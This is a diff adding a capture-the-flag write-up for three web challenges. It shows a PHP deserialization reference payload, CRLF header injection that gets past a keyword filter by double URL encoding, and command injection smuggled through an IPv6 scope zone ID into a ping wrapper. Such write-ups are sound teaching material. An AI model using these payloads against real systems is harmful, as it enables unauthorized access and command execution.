@@ -231,6 +231,459 @@ response = urllib.request.urlopen(req)
 print(response.read().decode())
 ```
 
+## Vault
+
+### Analysis
+
+When you access the website, there is a input for a `Vault Sequence`. The end goal of the challenge here is for you to insert a valid sequence that will eventually make the `$vault_open` to be `true`.
+
+![](./Website/image1.png)
+
+```php
+<?php
+require('sequence.php');
+ini_set('display_errors', 0);
+
+if ($_SERVER["REQUEST_METHOD"] === "POST") {
+    $vault_open = true;
+    $bankPin = new Sequence();
+    $bankPin->generateVaultRandom();
+
+    $user = $_POST['sequence'] ?? '';
+
+    if (!($base64DecodedSequence = base64_decode($user))) {
+        echo("DANGER ABORTING");
+        die();
+    }
+
+    if (!($validSequence = unserialize($base64DecodedSequence))) {
+        echo("NOT A VALID SEQUENCE");
+        die();
+    }
+
+    if (!($validSequence instanceof Sequence)) {
+        echo "NOT A VALID SEQUENCE";
+        die();
+    }
+
+    for ($x = 0; $x < 10; $x++) {
+        $validSequence->vaultCreds = $bankPin->vaultCreds; //set as bank creds
+    }
+
+    for ($z = 0; $z < 10; $z++) {
+        if ($validSequence->vaultCreds[$z] !== $validSequence->guardCreds[$z]) {
+            $vault_open = false;
+        }
+    }
+
+}
+?>
+```
+
+First step, is to send a `POST` request with the parameter of `sequence`, the value must be encoded in base64, if it is empty it will show the `DANGER ABORTING` output.
+
+```php
+if ($_SERVER["REQUEST_METHOD"] === "POST") {
+    $vault_open = true;
+    $bankPin = new Sequence();
+    $bankPin->generateVaultRandom();
+
+    $user = $_POST['sequence'] ?? '';
+
+    if (!($base64DecodedSequence = base64_decode($user))) {
+        echo("DANGER ABORTING");
+        die();
+    }
+
+    ...
+?>
+```
+
+Here, after decoding it from base64, it will check whether your input is in a form of [php serialization format](https://en.wikipedia.org/wiki/PHP_serialization_format)
+
+```php
+ if (!($validSequence = unserialize($base64DecodedSequence))) {
+        echo("NOT A VALID SEQUENCE");
+        die();
+    }
+
+if (!($validSequence instanceof Sequence)) {
+        echo "NOT A VALID SEQUENCE";
+        die();
+    }
+```
+
+To make a valid php serialization format that is an instance of sequence, we need to follow the `sequence class` that is created inside `sequence.php` as follows.
+
+```php
+class Sequence { // name of class "Sequence" with 8 characters
+    public $vaultCreds; // 1st property with 10 characters
+    public $guardCreds; // 2nd property with 10 characters
+
+    public function generateVaultRandom()
+    {
+        for ($x = 0; $x < 10; $x++) {
+            $randomNumber = random_int(0, 999999999);
+            $this->vaultCreds[] = $randomNumber;
+        }
+    }
+}
+```
+
+_Object Part_
+
+`O:8:"Sequence":2`
+
+- O = Object
+- 8 = Length of class name
+- "Sequence" = Class name
+- 2 = Number of properties
+
+_Sequence Part_
+
+`{s:10:"vaultCreds";a:0:{}s:10:"guardCreds";a:0:{}}`
+
+First property:
+
+- s:10:"vaultCreds" = Property name
+- a:0:{} = Empty array with the size of 10
+
+Second property:
+
+- s:10:"guardCreds" = Property name
+- a:0:{} = Empty array with the size of 10
+
+Combining both parts together now we have a valid sequence!
+`O:8:"Sequence":2{s:10:"vaultCreds";a:0:{}s:10:"guardCreds";a:0:{}}`
+
+Then the value of vaultCreds from `bankPin` object will randomly generated and assigned to the property vaultCreds of `validSequence` object.
+
+```php
+ for ($x = 0; $x < 10; $x++) {
+        $validSequence->vaultCreds = $bankPin->vaultCreds; //set as bank creds
+    }
+```
+
+Lastly, it will compare the values of vaultCreds to guardCreds.
+
+```php
+ for ($z = 0; $z < 10; $z++) {
+        if ($validSequence->vaultCreds[$z] !== $validSequence->guardCreds[$z]) {
+            $vault_open = false;
+        }
+}
+
+```
+
+The exploit here is actually to point the property of guardCreds to vaultCreds, therefore regardless what will happen to the value of vaultCreds, eventually it will always be the same as guardCreds, since guardCreds is pointing to vaultCreds :))
+
+`O:8:"Sequence":2:{s:10:"vaultCreds";a:0:{}s:10:"guardCreds";R:2;}`
+
+> Don't forget to encode it in base64!
+
+## Protecc
+
+### Analysis
+
+This website is running on flask, and at first glance, I thought it is related to XSS since the input looks like it is reflected to the page like so
+
+![](./Website/image2.png)
+
+But upon further research, I guess I was wrong because of Jinja2's autoescaping input which means that any special characters like `<, >, &, ", etc.` will be converted to HTML entities, plus there is no bots in the source code provided.
+
+![](./Website/image3.png)
+
+```python
+return render_template('index.html', protectionName=setName)
+```
+
+```html
+<body class="bg-gray-100 text-black dark:bg-gray-900 dark:text-white">
+  <div class="container mx-auto p-8">
+    <h1 class="mb-4 text-2xl font-bold">Name yo own protection</h1>
+    <form action="/" method="get" class="space-y-4">
+      <div>...</div>
+      <button
+        type="submit"
+        class="rounded-lg bg-blue-500 px-4 py-2 text-center text-base font-semibold text-white shadow-md transition duration-200 ease-in hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 focus:ring-offset-blue-200"
+      >
+        Set Protection
+      </button>
+      {% if protectionName %}
+
+      <div class="mt-4 w-full text-lg font-semibold">
+        Protection set to: {{ protectionName }}
+      </div>
+      {% endif %}
+
+      <div class="mx-auto mt-8">...</div>
+    </form>
+  </div>
+</body>
+```
+
+So let's try to analyze the the `app.py` and see what we can find.
+
+```python
+@app.route('/verifier', methods=['GET'])
+def verifier():
+    # To verify if everything is working as intended
+    input = request.args.get('input', '')
+
+    if input is not None and input != "":
+
+        response = requests.get(f"http://localhost:{port}/?setName=" + input)
+        xssProtection = response.headers.get('X-XSS-Protection')
+        RCEProtection = response.headers.get('Protection-RCE')
+        SecretProtection = response.headers.get('Protection-Secret')
+
+        # While we are it, let's add an admin check too for easy access.
+        adminCheck = response.headers.get('admin')
+
+        print(response.headers)
+
+        if all(header is not None and header != "" for header in [xssProtection, RCEProtection, SecretProtection]) and adminCheck == 'true':
+            return render_template('verifier.html', result="Wow you're an expert in protection! Here's your flag: " + flag)
+
+        return render_template('verifier.html', result="It's secure... I guess...?")
+    else:
+        return render_template('verifier.html', result="Please give me a recipe for the best protection")
+```
+
+So at `/verifier` endpoint, if we want the website to render the flag, we need to send in an `input` which is the value of `setName` parameter, that will eventually make the `server` to give response with these headers:-
+
+1. X-XSS-Protection: 1
+2. Protection-RCE: 1
+3. Protection-Secret: 1
+4. admin: true
+
+Any order is fine, and the value can be anything, EXCEPT for admin, the value must be `true`.
+
+The question here is, is it possible for us to modify the response header to meet the conditions?
+
+Well, thanks to `/` endpoint there is a `default` function that allows us to inject our input to the response headers!
+
+```python
+@app.route('/')
+def default():
+
+    headers = {
+        'X-Content-Type-Options': 'nosniff',
+        'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
+        'Referrer-Policy': 'no-referrer',
+        'Feature-Policy': "geolocation 'self'; microphone 'none'; camera 'none'",
+    }
+
+    protectionHeader: dict[str, str | bytes] = dict(headers)
+
+    setName = request.args.get('setName', '')
+
+    if filter(setName) == False:
+        return 'Hacking attempt...s?'
+    else:
+        setName = filter(setName)
+
+    if setName is not None and setName != "":
+
+        defaultProtectionValue = "1"
+        protectionHeader['X-XSS-Protection'] = defaultProtectionValue
+        protectionHeader['Protection-' + setName] = defaultProtectionValue
+
+    return render_template('index.html', protectionName=setName), protectionHeader
+```
+
+Let's try to understand it bit by bit. By default, if we send it any values for example just an `empty string`. These response headers will be included in the output for sure.
+
+```bash
+ headers = {
+        'X-Content-Type-Options': 'nosniff',
+        'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
+        'Referrer-Policy': 'no-referrer',
+        'Feature-Policy': "geolocation 'self'; microphone 'none'; camera 'none'",
+    }
+```
+
+```bash
+HTTP/1.1 200 OK
+Server: Werkzeug/3.0.6 Python/3.8.20
+Date: Mon, 27 Jan 2025 16:53:27 GMT
+X-Content-Type-Options: nosniff <------------ focus from here
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+Referrer-Policy: no-referrer
+'Feature-Policy': "geolocation 'self'; microphone 'none'; camera 'none'"
+*anything else that is included by default*
+```
+
+Now if we input any values for `setName`, for example the value `test`, there are 2 more headers pops up in the response headers!
+
+However, only of them meet the conditions, the second response header that is included is not even inside the list of condition :T
+
+1. X-XSS-Protection: 1 ✅
+2. Protection-test: 1 ❌
+
+```bash
+HTTP/1.1 200 OK
+Server: Werkzeug/3.0.6 Python/3.8.20
+Date: Mon, 27 Jan 2025 16:58:35 GMT
+X-Content-Type-Options: nosniff <------------ focus from here
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+Referrer-Policy: no-referrer
+Feature-Policy: geolocation 'self'; microphone 'none'; camera 'none'
+X-XSS-Protection: 1 <------------ new headers that is included
+Protection-test: 1
+*anything else that is included by default*
+```
+
+So to meet the conditions we were left with 3 more response headers. How do we modify the input so that we can include all of them in the response header?
+
+1. X-XSS-Protection: 1 ✅
+2. Protection-RCE: 1
+3. Protection-Secret: 1
+4. admin: true
+
+Let's try `Protection-RCE: 1` first since it is the easiest, just input `RCE` we don't need to include the values `: 1`, since it is added by default to the last response header that is created.
+
+1. X-XSS-Protection: 1 ✅
+2. Protection-RCE: 1 ✅
+
+```bash
+GET /?setName=RCE HTTP/1.1
+
+HTTP/1.1 200 OK
+Server: Werkzeug/3.0.6 Python/3.8.20
+Date: Mon, 27 Jan 2025 17:34:14 GMT
+...
+X-XSS-Protection: 1 ✅
+Protection-RCE: 1 ✅
+```
+
+Now to include one more response header lets say `Protection-Secret: 1`, you need to find out how to create a new line in response header. In python/flask it is possible to do that by using `%0d%0a`.
+
+```bash
+GET /?setName=RCE%0d%0aProtection-Secret HTTP/1.1
+
+HTTP/1.1 200 OK
+Server: Werkzeug/3.0.6 Python/3.8.20
+...
+X-XSS-Protection: 1 ✅
+Protection-RCE ❌
+Protection-Secret: 1 ✅
+```
+
+But we can't set its value to `: 1` because... the char `:` is blacklisted :T
+
+```python
+def filter(input):
+    blockedPattern = [':', 'admin', 'true']
+    for pattern in blockedPattern:
+        if pattern in input or pattern.lower() in input or pattern.upper() in input:
+            return False
+    return unquote(input)
+```
+
+To bypass the function just `URL Encode` the blacklisted characters `2 times`. For non-special characters like `admin` can be url encoded by using this [website](https://onlinetexttools.com/url-encode-text) or just create a script on python.
+
+1. ':' will become `%253A`
+2. 'admin' will become `%2561%2564%256D%2569%256E`
+3. 'true' will become `%2574%2572%2575%2565`
+
+```bash
+GET /?setName=RCE%253A%201%0d%0aProtection-Secret HTTP/1.1
+
+HTTP/1.1 200 OK
+Server: Werkzeug/3.0.6 Python/3.8.20
+...
+X-XSS-Protection: 1 ✅
+Protection-RCE: 1 ✅
+Protection-Secret: 1 ✅
+```
+
+And now we are left with the last header which is `admin: true`. As stated before just double url encode it :))
+
+```bash
+GET /?setName=RCE%253A%201%0d%0a%2561%2564%256D%2569%256E%253A%20%2574%2572%2575%2565%0d%0aProtection-Secret HTTP/1.1
+
+HTTP/1.1 200 OK
+Server: Werkzeug/3.0.6 Python/3.8.20
+...
+X-XSS-Protection: 1 ✅
+Protection-RCE: 1 ✅
+admin: true ✅
+Protection-Secret: 1 ✅
+```
+
+Just for your information the payload that we are using right now will only work if we directly put it inside the input form and not at the URL, both input form and URL process the payload differently, for example browsers usually auto-encoding special characters again at the URL. :T
+
+## Ping as a Service
+
+This website is really simple, nothing crazy going on...
+
+```python
+#!/usr/bin/env python3
+import subprocess
+import ipaddress
+from flask import Flask, request, render_template
+
+app = Flask(__name__)
+
+@app.route('/', methods=['GET', 'OPTIONS'])
+def ping():
+    user_supplied_IP = request.args.get('IP', '')
+    try:
+        myIPaddress = ipaddress.ip_address(user_supplied_IP)
+    except ValueError:
+        custom_error_msg = 'You supplied an invalid IP address'
+        return render_template('index.html', result=custom_error_msg)
+
+    command_to_execute = f'ping -c 2 {myIPaddress}'
+    print(command_to_execute, flush=True)
+    try:
+        results = subprocess.check_output(['/bin/sh', '-c', command_to_execute], timeout=8)
+        return render_template('index.html', result=results.decode('utf-8'))
+    except subprocess.TimeoutExpired:
+        custom_error_msg = 'Request Timed Out!'
+        return render_template('index.html', result=custom_error_msg)
+    except subprocess.CalledProcessError:
+        custom_error_msg = 'An error occured'
+        return render_template('index.html', result=custom_error_msg)
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5004)
+```
+
+At first glance, it looks like the website is vulnerable to `command injection` due to this part of code. It directly uses the `IP` parameter and append it at the end of the command `ping -c 2 {IP here}`.
+
+```python
+def ping():
+    user_supplied_IP = request.args.get('IP', '')
+    try:
+        myIPaddress = ipaddress.ip_address(user_supplied_IP)
+    except ValueError:
+        custom_error_msg = 'You supplied an invalid IP address'
+        return render_template('index.html', result=custom_error_msg)
+
+    command_to_execute = f'ping -c 2 {myIPaddress}'
+    print(command_to_execute, flush=True)
+```
+
+Technically, if I try to send in input like `127.0.0.1; whoami`. It should execute the first command which is to ping `127.0.0.1` and then proceed with the second command `whoami` right..? Welp it doesn't work at all, I keep on getting `You supplied an invalid IP address`.
+
+This is because of the `ipaddress.ipaddress()` function finds out that all of the `IPv4 Address` that we are trying to ping looks funny, in returns, gives us the `ValueError` output.
+
+```python
+myIPaddress = ipaddress.ip_address(user_supplied_IP)
+```
+
+![](./Website/image4.png)
+
+I myself not a fan of reading docs, but decided to read it again and luckily this time found something suspicious.
+
+> Optionally, the string may also have a scope zone ID, expressed with a suffix %scope_id. If present, the scope ID must be non-empty, and may not contain %. See RFC 4007 for details. For example, fe80::1234%1 might identify address fe80::1234 on the first link of the node.
+
+Therefore, I try to use IPv6 address together with a scope zone ID something like this request `2001:db8::1%1; ls` (without knowing the functionality of it ofc) and somehow it accepts the input together with the command injection payload :))
+
+![](./Website/image5.png)
+
 # Mobile
 
 ## Who's that Pukimon
